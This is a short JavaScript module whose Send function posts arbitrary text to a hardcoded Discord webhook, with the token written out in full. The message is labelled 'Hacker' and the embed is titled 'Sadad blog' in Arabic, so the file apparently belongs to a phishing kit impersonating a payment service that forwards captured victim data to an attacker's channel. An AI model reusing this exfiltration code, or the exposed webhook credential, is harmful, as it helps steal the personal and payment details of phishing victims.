import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1328488284728590398/OhU9PCVIOSPrjgmf3ctQASFLyw6f7TJ9Al86eUm7cRDsHYcAvBaGDEwZO8ft3D288Wub",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
